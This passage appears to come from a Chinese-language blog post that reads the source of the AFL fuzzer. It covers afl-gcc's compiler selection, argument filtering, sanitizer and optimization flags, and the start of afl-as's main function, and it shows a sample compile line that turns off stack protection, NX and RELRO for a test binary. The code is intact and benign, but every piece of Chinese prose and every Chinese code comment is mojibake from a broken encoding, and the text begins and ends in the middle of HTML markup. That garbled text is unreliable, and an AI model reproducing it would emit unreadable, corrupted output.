128ä¸ªé¢å¤–æ§½ä½ï¼‰</p></li><li><p>ä½¿ç”¨AFLçš„å®‰å…¨å†…å­˜åˆ†é…å‡½æ•°</p></li></ul><h5 id="2-ç¡®å®šç¼–è¯‘å™¨ç±»å‹å’Œè·¯å¾„"><a href="#2-ç¡®å®šç¼–è¯‘å™¨ç±»å‹å’Œè·¯å¾„" class="headerlink" title="2. ç¡®å®šç¼–è¯‘å™¨ç±»å‹å’Œè·¯å¾„"></a>2. ç¡®å®šç¼–è¯‘å™¨ç±»å‹å’Œè·¯å¾„</h5><p>ç¼–è¯‘å™¨é€‰æ‹©é€»è¾‘ï¼š</p><table><thead><tr><th align="left">è°ƒç”¨åç§°</th><th align="left">é»˜è®¤ç¼–è¯‘å™¨</th><th align="left">ç¯å¢ƒå˜é‡è¦†ç›–</th></tr></thead><tbody><tr><td align="left">afl-clang++</td><td align="left">clang++</td><td align="left">$AFL_CXX</td></tr><tr><td align="left">afl-clang</td><td align="left">clang</td><td align="left">$AFL_CC</td></tr><tr><td align="left">afl-g++</td><td align="left">g++</td><td align="left">$AFL_CXX</td></tr><tr><td align="left">afl-gcj</td><td align="left">gcj</td><td align="left">$AFL_GCJ</td></tr><tr><td align="left">afl-gcc</td><td align="left">gcc</td><td align="left">$AFL_CC</td></tr></tbody></table><h5 id="3-macOSç‰¹æ®Šå¤„ç†"><a href="#3-macOSç‰¹æ®Šå¤„ç†" class="headerlink" title="3. macOSç‰¹æ®Šå¤„ç†"></a>3. macOSç‰¹æ®Šå¤„ç†</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>åŸå› ï¼šåœ¨macOSä¸Šï¼Œgccé€šå¸¸æ˜¯clangçš„åˆ«åï¼Œéœ€è¦æ˜ç¡®æŒ‡å®šç¼–è¯‘å™¨è·¯å¾„ã€‚</p><h5 id="4-å¤„ç†åŸå§‹ç¼–è¯‘å‚æ•°"><a href="#4-å¤„ç†åŸå§‹ç¼–è¯‘å‚æ•°" class="headerlink" title="4. å¤„ç†åŸå§‹ç¼–è¯‘å‚æ•°"></a>4. å¤„ç†åŸå§‹ç¼–è¯‘å‚æ•°</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">// è·³è¿‡-Bå‚æ•°ï¼ŒAFLä¼šè®¾ç½®è‡ªå·±çš„-B</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;  <span class="comment">// è·³è¿‡</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;           <span class="comment">// è·³è¿‡</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ£€æµ‹ASANå’ŒFORTIFY_SOURCE</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) || </span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    cc_params[cc_par_cnt++] = cur;  <span class="comment">// ä¿ç•™å…¶ä»–å‚æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°å¤„ç†ç­–ç•¥ï¼š</p><ul><li><p>è·³è¿‡çš„å‚æ•°ï¼š<code>-B, -integrated-as, -pipe</code></p></li><li><p>æ£€æµ‹çš„å‚æ•°ï¼š<code>-fsanitize=*, FORTIFY_SOURCE</code></p></li><li><p>ç‰¹æ®Šæ ‡è®°ï¼šFreeBSD x64ä¸‹çš„-m32</p></li><li><p>ä¿ç•™çš„å‚æ•°ï¼šå…¶ä»–æ‰€æœ‰å‚æ•°</p></li></ul><h5 id="5-æ·»åŠ AFLç‰¹å®šå‚æ•°"><a href="#5-æ·»åŠ AFLç‰¹å®šå‚æ•°" class="headerlink" title="5. æ·»åŠ AFLç‰¹å®šå‚æ•°"></a>5. æ·»åŠ AFLç‰¹å®šå‚æ•°</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">cc_params[cc_par_cnt++] = as_path;  <span class="comment">// æŒ‡å‘AFLçš„æ±‡ç¼–å™¨åŒ…è£…å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼š</p><ul><li><p>å¼ºåˆ¶ä½¿ç”¨AFLçš„æ±‡ç¼–å™¨åŒ…è£…å™¨</p></li><li><p>Clangæ¨¡å¼ä¸‹ç¦ç”¨é›†æˆæ±‡ç¼–å™¨</p></li></ul><p>åŠ å›ºæªæ–½ï¼š</p><ul><li><p>å¯ç”¨æ ˆä¿æŠ¤ï¼š-fstack-protector-all</p></li><li><p>å¯ç”¨FORTIFY_SOURCEï¼š-D_FORTIFY_SOURCE&#x3D;2ï¼ˆå¦‚æœæœªè®¾ç½®ï¼‰</p></li></ul><h5 id="6-å†…å­˜æ£€æµ‹å·¥å…·æ”¯æŒ"><a href="#6-å†…å­˜æ£€æµ‹å·¥å…·æ”¯æŒ" class="headerlink" title="6. å†…å­˜æ£€æµ‹å·¥å…·æ”¯æŒ"></a>6. å†…å­˜æ£€æµ‹å·¥å…·æ”¯æŒ</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);  <span class="comment">// é€šçŸ¥afl-asè°ƒæ•´æ˜ å°„å¯†åº¦</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// ç±»ä¼¼çš„MSANå¤„ç†é€»è¾‘</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äº’æ–¥æ€§æ£€æŸ¥ï¼š</p><ul><li><p>ASANä¸MSANä¸èƒ½åŒæ—¶ä½¿ç”¨</p></li><li><p>ASAN&#x2F;MSANä¸AFL_HARDENä¸èƒ½åŒæ—¶ä½¿ç”¨</p></li></ul><h5 id="7-ä¼˜åŒ–å’Œè°ƒè¯•é€‰é¡¹"><a href="#7-ä¼˜åŒ–å’Œè°ƒè¯•é€‰é¡¹" class="headerlink" title="7. ä¼˜åŒ–å’Œè°ƒè¯•é€‰é¡¹"></a>7. ä¼˜åŒ–å’Œè°ƒè¯•é€‰é¡¹</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">        cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ¨¡ç³Šæµ‹è¯•æ ‡è¯†å®</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é»˜è®¤ä¼˜åŒ–è®¾ç½®ï¼š</p><ul><li><p>å¯ç”¨è°ƒè¯•ä¿¡æ¯ï¼š-g</p></li><li><p>é«˜çº§ä¼˜åŒ–ï¼š-O3</p></li><li><p>å¾ªç¯å±•å¼€ï¼š-funroll-loops</p></li><li><p>å®šä¹‰æ¨¡ç³Šæµ‹è¯•å®</p></li></ul><p>FreeBSDç‰¹æ®Šå¤„ç†ï¼šåœ¨64ä½FreeBSDç³»ç»Ÿä¸Šï¼Œclang -g -m32æœ‰bugï¼Œéœ€è¦ç‰¹æ®Šå¤„ç†ã€‚</p><h5 id="8-ç¦ç”¨å†…å»ºå‡½æ•°ä¼˜åŒ–-AFL-NO-BUILTIN"><a href="#8-ç¦ç”¨å†…å»ºå‡½æ•°ä¼˜åŒ–-AFL-NO-BUILTIN" class="headerlink" title="8. ç¦ç”¨å†…å»ºå‡½æ•°ä¼˜åŒ– (AFL_NO_BUILTIN)"></a>8. ç¦ç”¨å†…å»ºå‡½æ•°ä¼˜åŒ– (AFL_NO_BUILTIN)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®çš„ï¼š</p><ul><li><p>ç¦ç”¨å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°çš„ç¼–è¯‘å™¨ä¼˜åŒ–</p></li><li><p>ç¡®ä¿è¿™äº›å‡½æ•°è°ƒç”¨èƒ½è¢«AFLçš„æ’æ¡©æ•è·</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h5 id="ç¯å¢ƒå˜é‡æ”¯æŒ"><a href="#ç¯å¢ƒå˜é‡æ”¯æŒ" class="headerlink" title="ç¯å¢ƒå˜é‡æ”¯æŒ"></a>ç¯å¢ƒå˜é‡æ”¯æŒ</h5><table><thead><tr><th align="left">ç¯å¢ƒå˜é‡</th><th align="left">åŠŸèƒ½</th><th align="left">é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left">AFL_CC</td><td align="left">æŒ‡å®šCç¼–è¯‘å™¨è·¯å¾„</td><td align="left">gcc&#x2F;clang</td></tr><tr><td align="left">AFL_CXX</td><td align="left">æŒ‡å®šC++ç¼–è¯‘å™¨è·¯å¾„</td><td align="left">g++&#x2F;clang++</td></tr><tr><td align="left">AFL_GCJ</td><td align="left">æŒ‡å®šGCJç¼–è¯‘å™¨è·¯å¾„</td><td align="left">gcj</td></tr><tr><td align="left">AFL_HARDEN</td><td align="left">å¯ç”¨å®‰å…¨åŠ å›ºé€‰é¡¹</td><td align="left">æ— </td></tr><tr><td align="left">AFL_USE_ASAN</td><td align="left">å¯ç”¨AddressSanitizer</td><td align="left">æ— </td></tr><tr><td align="left">AFL_USE_MSAN</td><td align="left">å¯ç”¨MemorySanitizer</td><td align="left">æ— </td></tr><tr><td align="left">AFL_DONT_OPTIMIZE</td><td align="left">ç¦ç”¨é»˜è®¤ä¼˜åŒ–</td><td align="left">æ— </td></tr><tr><td align="left">AFL_NO_BUILTIN</td><td align="left">ç¦ç”¨å†…å»ºå‡½æ•°ä¼˜åŒ–</td><td align="left">æ— </td></tr></tbody></table><h3 id="execvp"><a href="#execvp" class="headerlink" title="execvp"></a>execvp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ‰§è¡Œç¼–è¯‘ç›¸åº”çš„æºæ–‡ä»¶</p><p>è‡³æ­¤afl-gccå°±åˆ†æå®Œæ¯•</p><h2 id="ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹"><a href="#ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹"></a>ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -no-pie -z norelro /home/cyberangel/Desktop/test/test.c \</span><br><span class="line">  -o  /home/cyberangel/Desktop/test/test_fuzz_gcc_source \</span><br><span class="line">  -B  /usr/local/lib/afl -g -O3 \</span><br><span class="line">  -funroll-loops -D__AFL_COMPILER=1 \</span><br><span class="line">  -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç”¨cyberangelå¸ˆå‚…æä¾›çš„ä¾‹å­åšä¸€ä¸ªè®°å½•</p></blockquote><p>ä¼šå‘ç°æœ€åexecvpçš„å‘½ä»¤æ˜¯è¿™ä¸€ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡-Bæ¥æŒ‡å®šæˆ‘ä»¬è‡ªå·±çš„asï¼ˆæ±‡ç¼–å™¨ï¼‰</p><p>gccç¼–è¯‘å¤§å¤šéƒ½è®¤ä¸ºæ˜¯ä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><ul><li>é¢„å¤„ç†ï¼Œç”Ÿæˆé¢„ç¼–è¯‘æ–‡ä»¶ï¼ˆ**.i**æ–‡ä»¶ï¼‰ï¼š<code>gcc â€“E main.c â€“o main.i</code><ul><li>æ–‡ä»¶åŒ…å«(<code>#include</code>)ã€æ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†ã€å®å®šä¹‰å±•å¼€åŠå¤„ç†(<code>#define</code>)ã€æ¡ä»¶ç¼–è¯‘å¤„ç†(<code>#ifdef</code>)ã€æ¸…ç†æ³¨é‡Šå†…å®¹ã€ç‰¹æ®Šæ§åˆ¶å¤„ç†(<code>#pragma/#error</code>)</li></ul></li><li>ç¼–è¯‘ï¼Œç”Ÿæˆæ±‡ç¼–ä»£ç ï¼ˆ**.s**æ–‡ä»¶ï¼‰ï¼š<code>gcc â€“S main.i â€“o main.s</code><ul><li>è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€ä»£ç ä¼˜åŒ–</li></ul></li><li>æ±‡ç¼–ï¼Œç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼ˆ**.o**æ–‡ä»¶ï¼‰ï¼š<code>gcc â€“c main.s â€“o main.o</code><ul><li>æ±‡ç¼–-&gt;å¯æ‰§è¡Œæœºå™¨ç </li></ul></li><li>é“¾æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ<strong>executable</strong>æ–‡ä»¶ï¼‰ï¼š<code>gcc main.o â€“o main</code></li></ul><p>ä¼šå‘ç°ä¸Šè¿°çš„gccåªæŒ‡å®šäº†ç‰¹æ®Šçš„asï¼ˆå³æ±‡ç¼–å™¨ï¼‰ï¼Œå› æ­¤å¯ä»¥çŒœæµ‹å‡ºæ˜¯é€šè¿‡åŠ«æŒæ±‡ç¼–å™¨æ¥è¾¾åˆ°åœ¨ç‰¹æ®Šä½ç½®æ’å…¥ç‰¹æ®Šå‡½æ•°çš„ç»“æœï¼Œå› æ­¤æ¥ä¸‹æ¥çœ‹ä¸€æ‰‹aflçš„asæºç </p><h2 id="afl-asæºç é˜…è¯»"><a href="#afl-asæºç é˜…è¯»" class="headerlink" title="afl-asæºç é˜…è¯»"></a>afl-asæºç é˜…è¯»</h2><p><strong>æ ¸å¿ƒæ•°æ®ç»“æ„å’Œå…¨å±€å˜é‡ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8** as_params;          <span class="comment">/* ä¼ é€’ç»™çœŸå® &#x27;as&#x27; çš„å‚æ•° */</span></span><br><span class="line"><span class="type">static</span> u8*  input_file;         <span class="comment">/* åŸå§‹è¾“å…¥æ–‡ä»¶ */</span></span><br><span class="line"><span class="type">static</span> u8*  modified_file;      <span class="comment">/* æ’æ¡©åçš„æ–‡ä»¶ */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u8   be_quiet,           <span class="comment">/* é™é»˜æ¨¡å¼ */</span></span><br><span class="line">            clang_mode,         <span class="comment">/* æ˜¯å¦è¿è¡Œåœ¨ clang æ¨¡å¼ */</span></span><br><span class="line">            pass_thru,          <span class="comment">/* æ˜¯å¦ç›´æ¥ä¼ é€’æ•°æ® */</span></span><br><span class="line">            just_version,       <span class="comment">/* åªæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ */</span></span><br><span class="line">            sanitizer;          <span class="comment">/* æ˜¯å¦ä½¿ç”¨ ASAN/MSAN */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32  inst_ratio = <span class="number">100</span>,   <span class="comment">/* æ’æ¡©æ¦‚ç‡ï¼ˆ%ï¼‰ */</span></span><br><span class="line">            as_par_cnt = <span class="number">1</span>;     <span class="comment">/* &#x27;as&#x27; å‚æ•°æ•°é‡ */</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  clang_mode = !!<span class="built_in">getenv</span>(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);  <span class="comment">//è·å¾—å½“å‰ç³»ç»Ÿæ—¶é—´</span></span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();  <span class="comment">//ç§å­</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">srandom</span>(rand_seed);  <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(AS_LOOP_ENV_VAR))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span 